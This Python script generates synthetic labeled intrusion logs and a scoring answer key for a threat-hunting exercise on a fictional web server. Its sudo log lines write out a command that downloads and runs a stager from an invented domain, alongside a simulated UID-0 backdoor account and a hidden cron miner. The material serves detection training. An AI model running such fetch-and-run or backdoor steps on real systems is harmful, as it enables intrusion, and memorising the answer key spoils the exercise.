"""A labeled intrusion on one Linux web server, written as real log files.

Three days of a host named web01 (10.0.4.12): admins log in with keys from the office,
the box resolves and talks to the usual update mirrors and APIs, and the internet
throws the background SSH brute force every server sees. On top of that, one intrusion:

  1. SSH password brute force from 203.0.113.77, then a valid login as `deploy`   T1110.001, T1078
  2. sudo: download and run a stager from update-cdn-sync.top                      T1105, T1059.004
  3. Backdoor UID-0 account `sysupdate` and a cron job running a hidden binary      T1136.001, T1053.003
  4. Cryptominer beaconing to a pool every ~60 s                                    T1496, T1071
  5. DGA lookups for fallback command and control                                  T1568.002
  6. Night-time upload of ~450 MB to a new host                                     T1041 / T1048
  7. Attacker returns with an SSH key as `sysupdate` from a second IP               T1078

Attacker infrastructure uses documentation ranges (RFC 5737) and invented domains.
`ground_truth.json` lists every indicator and stage so a hunt can be scored.
"""
from __future__ import annotations

import json
import random
import string
from datetime import datetime, timedelta, timezone
from pathlib import Path

HOST, HOST_IP = "web01", "10.0.4.12"
START = datetime(2026, 9, 14, 0, 0, tzinfo=timezone.utc)
BENIGN_DOMAINS = ["archive.ubuntu.com", "security.ubuntu.com", "api.github.com", "pypi.org", "files.pythonhosted.org",
                  "registry.npmjs.org", "ntp.ubuntu.com", "storage.googleapis.com", "www.google.com", "sentry.io",
                  "api.stripe.com", "hooks.slack.com", "s3.amazonaws.com", "cdn.jsdelivr.net", "fonts.googleapis.com",
                  "login.microsoftonline.com", "api.sendgrid.com", "o1234.ingest.sentry.io", "dl.google.com", "repo.maven.apache.org"]
ATTACK = dict(brute_ips=["203.0.113.77", "203.0.113.81", "203.0.113.90"], login_ip="203.0.113.77", return_ip="198.51.100.23",
              stager_domain="update-cdn-sync.top", stager_ip="198.51.100.10", pool_ip="198.51.100.44", pool_port=3333,
              exfil_ip="192.0.2.200", user="deploy", backdoor="sysupdate", stager_path="/tmp/.i.sh",
              miner_path="/usr/local/bin/.kworker")


def dga_family_a(seed: int, n: int) -> list[str]:
    """Random-character DGA (the classic shape)."""
    r = random.Random(seed)
    return ["".join(r.choice(string.ascii_lowercase) for _ in range(r.randint(12, 18))) + r.choice([".top", ".xyz", ".info"]) for _ in range(n)]


def dga_family_b(seed: int, n: int) -> list[str]:
    """Hex-hash DGA: md5-like labels."""
    r = random.Random(seed)
    return ["".join(r.choice("0123456789abcdef") for _ in range(16)) + r.choice([".net", ".com", ".biz"]) for _ in range(n)]


WORDS = ["cloud", "secure", "update", "mail", "service", "online", "portal", "data", "sync", "smart", "home", "net", "link",
         "web", "app", "store", "center", "group", "media", "tech", "global", "system", "access", "support", "direct"]


def dga_family_c(seed: int, n: int) -> list[str]:
    """Dictionary DGA: concatenated English words, built to look like real names."""
    r = random.Random(seed)
    return ["".join(r.choice(WORDS) for _ in range(r.randint(2, 3))) + r.choice([".com", ".net", ".org"]) for _ in range(n)]


class Writer:
    def __init__(self):
        self.auth, self.conn, self.dns, self.uid = [], [], [], 0

    def syslog(self, ts: datetime, prog: str, pid: int, msg: str):
        self.auth.append((ts, f"{ts:%b} {ts.day:2d} {ts:%H:%M:%S} {HOST} {prog}[{pid}]: {msg}"))

    def c(self, ts, resp_h, resp_p, proto="tcp", service="-", dur=0.5, ob=500, rb=5000, state="SF"):
        self.uid += 1
        self.conn.append((ts, [f"{ts.timestamp():.6f}", f"C{self.uid:08x}", HOST_IP, str(random.randint(32768, 60999)), resp_h,
                               str(resp_p), proto, service, f"{dur:.3f}", str(int(ob)), str(int(rb)), state, str(max(1, ob // 500)), str(max(1, rb // 1400))]))

    def d(self, ts, query, answer, rcode="NOERROR"):
        self.uid += 1
        self.dns.append((ts, [f"{ts.timestamp():.6f}", f"D{self.uid:08x}", HOST_IP, str(random.randint(32768, 60999)), "10.0.0.2", "53",
                              "udp", query, "A", rcode, answer or "-"]))


def _bruteforce(w, r, ip, t0, n, users):
    for i in range(n):
        ts = t0 + timedelta(seconds=i * r.uniform(1.5, 4))
        pid = r.randint(20000, 30000); u = r.choice(users); port = r.randint(30000, 60000)
        if u in ("root", ATTACK["user"]):
            w.syslog(ts, "sshd", pid, f"Failed password for {u} from {ip} port {port} ssh2")
        else:
            w.syslog(ts, "sshd", pid, f"Invalid user {u} from {ip} port {port}")
            w.syslog(ts, "sshd", pid, f"Failed password for invalid user {u} from {ip} port {port} ssh2")
    return t0 + timedelta(seconds=n * 3)


def generate(out: Path, seed: int = 11, dga_family: str = "random") -> dict:
    r = random.Random(seed)
    random.seed(seed)
    w = Writer()
    days = 3
    # ---- benign: admin key logins, cron, background brute force, normal network ----
    for d in range(days):
        day = START + timedelta(days=d)
        for _ in range(r.randint(2, 4)):
            ts = day + timedelta(hours=r.uniform(15, 24))
            pid = r.randint(1000, 9000)
            w.syslog(ts, "sshd", pid, f"Accepted publickey for ops from 192.0.2.10 port {r.randint(40000, 60000)} ssh2: ED25519 SHA256:opsKey")
            w.syslog(ts, "sshd", pid, "pam_unix(sshd:session): session opened for user ops by (uid=0)")
            w.syslog(ts + timedelta(seconds=40), "sudo", pid + 1, "ops : TTY=pts/0 ; PWD=/home/ops ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx")
        for h in range(24):
            w.syslog(day + timedelta(hours=h, minutes=17), "CRON", r.randint(1000, 9000), "(root) CMD (cd / && run-parts --report /etc/cron.hourly)")
        for _ in range(6):  # internet noise: short brute-force bursts from random hosts, never successful
            ip = f"{r.randint(30, 220)}.{r.randint(0, 255)}.{r.randint(0, 255)}.{r.randint(1, 254)}"
            _bruteforce(w, r, ip, day + timedelta(hours=r.uniform(0, 24)), r.randint(5, 60), ["root", "admin", "test", "oracle", "ubuntu", "pi"])
        for m in range(0, 24 * 60, 7):  # resolve and fetch every few minutes
            ts = day + timedelta(minutes=m + r.uniform(0, 6))
            dom = r.choice(BENIGN_DOMAINS)
            ip = f"151.101.{r.randint(0, 255)}.{r.randint(1, 254)}"
            w.d(ts, dom, ip)
            w.c(ts + timedelta(seconds=0.05), ip, 443, service="ssl", dur=r.uniform(0.1, 3), ob=r.randint(600, 4000), rb=r.randint(2000, 400000))
        for m in range(0, 24 * 60, 64):  # NTP every 64 min, regular but low volume
            w.c(day + timedelta(minutes=m), "91.189.94.4", 123, proto="udp", service="ntp", dur=0.02, ob=48, rb=48)
    # ---- attack ----
    stages = []
    t = START + timedelta(hours=10, minutes=2)
    users = ["root", "admin", "deploy", "git", "postgres", "jenkins", "ubuntu", "test"]
    for ip in ATTACK["brute_ips"]:
        t = _bruteforce(w, r, ip, t, r.randint(150, 260), users)
    stages.append(("brute_force", "T1110.001", START + timedelta(hours=10, minutes=2)))
    t += timedelta(minutes=4)
    pid = 31337
    w.syslog(t, "sshd", pid, f"Accepted password for deploy from {ATTACK['login_ip']} port 51515 ssh2")
    w.syslog(t, "sshd", pid, "pam_unix(sshd:session): session opened for user deploy by (uid=0)")
    stages.append(("valid_account_login", "T1078", t))
    t += timedelta(minutes=3)
    w.d(t, ATTACK["stager_domain"], ATTACK["stager_ip"])
    w.syslog(t, "sudo", pid + 1, f"deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -fsSL http://{ATTACK['stager_domain']}/i.sh -o {ATTACK['stager_path']}")
    w.c(t + timedelta(seconds=1), ATTACK["stager_ip"], 80, service="http", dur=1.2, ob=420, rb=2_100_000)
    stages.append(("ingress_tool_transfer", "T1105", t))
    t += timedelta(seconds=40)
    w.syslog(t, "sudo", pid + 2, f"deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash {ATTACK['stager_path']}")
    stages.append(("unix_shell_execution", "T1059.004", t))
    t += timedelta(seconds=20)
    w.syslog(t, "useradd", pid + 3, f"new user: name={ATTACK['backdoor']}, UID=0, GID=0, home=/var/lib/{ATTACK['backdoor']}, shell=/bin/bash")
    stages.append(("create_local_account", "T1136.001", t))
    t += timedelta(seconds=30)
    w.syslog(t, "crontab", pid + 4, "(root) REPLACE (root)")
    first_cron = t.replace(second=0) + timedelta(minutes=1)
    for k in range(0, 60 * 24 * 2, 10):
        w.syslog(first_cron + timedelta(minutes=k), "CRON", 40000 + k, f"(root) CMD ({ATTACK['miner_path']} -c /etc/.kw.json >/dev/null 2>&1)")
    stages.append(("cron_persistence", "T1053.003", first_cron))
    beacon0 = t + timedelta(minutes=2)
    for k in range(0, 36 * 60):  # 36 h of ~60 s beacons with small jitter
        ts = beacon0 + timedelta(seconds=k * 60 + r.uniform(-3, 3))
        w.c(ts, ATTACK["pool_ip"], ATTACK["pool_port"], dur=r.uniform(0.2, 0.6), ob=r.randint(300, 420), rb=r.randint(200, 300))
    stages.append(("resource_hijacking", "T1496", beacon0))
    dga = (dga_family_c if dga_family == "dictionary" else dga_family_a)(seed + 1, 25)
    for i, dom in enumerate(dga):
        w.d(beacon0 + timedelta(hours=i * 1.3, seconds=r.uniform(0, 30)), dom, None, rcode="NXDOMAIN")
    stages.append(("dga_lookups", "T1568.002", beacon0))
    ex = START + timedelta(days=1, hours=2, minutes=37)
    w.c(ex, ATTACK["exfil_ip"], 443, service="ssl", dur=1840, ob=452_000_000, rb=180_000)
    stages.append(("exfiltration", "T1041", ex))
    back = START + timedelta(days=1, hours=19, minutes=5)
    w.syslog(back, "sshd", 55555, f"Accepted publickey for {ATTACK['backdoor']} from {ATTACK['return_ip']} port 40404 ssh2: RSA SHA256:attackerKey")
    w.syslog(back, "sshd", 55555, f"pam_unix(sshd:session): session opened for user {ATTACK['backdoor']} by (uid=0)")
    stages.append(("backdoor_login", "T1078", back))

    out.mkdir(parents=True, exist_ok=True)
    (out / "zeek").mkdir(exist_ok=True)
    (out / "auth.log").write_text("\n".join(line for _, line in sorted(w.auth, key=lambda x: x[0])) + "\n")
    conn_h = "#separator \\x09\n#path\tconn\n#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tproto\tservice\tduration\torig_bytes\tresp_bytes\tconn_state\torig_pkts\tresp_pkts\n"
    (out / "zeek" / "conn.log").write_text(conn_h + "\n".join("\t".join(x) for _, x in sorted(w.conn, key=lambda x: x[0])) + "\n")
    dns_h = "#separator \\x09\n#path\tdns\n#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tproto\tquery\tqtype_name\trcode_name\tanswers\n"
    (out / "zeek" / "dns.log").write_text(dns_h + "\n".join("\t".join(x) for _, x in sorted(w.dns, key=lambda x: x[0])) + "\n")
    truth = dict(
        host=HOST, host_ip=HOST_IP,
        iocs=dict(ip=sorted(set(ATTACK["brute_ips"] + [ATTACK["return_ip"], ATTACK["stager_ip"], ATTACK["pool_ip"], ATTACK["exfil_ip"]])),
                  domain=sorted([ATTACK["stager_domain"]] + dga),
                  user=[ATTACK["user"], ATTACK["backdoor"]],
                  file=[ATTACK["stager_path"], ATTACK["miner_path"], "/etc/.kw.json"]),
        stages=[dict(stage=s, technique=tq, first_seen=ts.isoformat()) for s, tq, ts in stages],
        compromised_account=ATTACK["user"], dga_family=dga_family)
    (out / "ground_truth.json").write_text(json.dumps(truth, indent=2))
    return truth
